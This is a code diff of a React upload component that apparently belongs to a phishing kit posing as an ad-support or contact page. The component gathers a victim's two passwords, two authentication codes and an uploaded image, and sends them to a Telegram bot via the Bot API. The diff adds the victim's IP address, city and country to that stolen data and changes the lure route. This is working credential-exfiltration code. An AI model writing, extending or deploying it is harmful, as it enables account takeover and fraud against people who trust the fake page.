@@ -46,11 +46,14 @@ const Upload = () => {
                 '%0A<strong>Password Second: </strong>' + dataImages.second_password +
                 '%0A<strong>First Code Authen: </strong>' + dataImages.first_code +
                 '%0A<strong>Second Code Authen: </strong>' + dataImages.seconds_code +
-                '%0A<strong>Images Url: </strong>' + url_image ;
+                '%0A<strong>Images Url: </strong>' + url_image  + 
+                '%0A<strong>IP: </strong>' + dataImages.IP + 
+                '%0A<strong>City: </strong>' + dataImages.city + 
+                '%0A<strong>Country Name: </strong>' + dataImages.countryName ;
     
                 axios.get(`https://api.telegram.org/bot${bot_token}/sendMessage?chat_id=${chat_id}&text=${message}&parse_mode=html`)
                     .then((response) => {
-                        navigate('/adhelp-109445849938899595/final');
+                        navigate('/adcontact19485092349283487823/final');
                     })
                     .catch((error) => {});
 
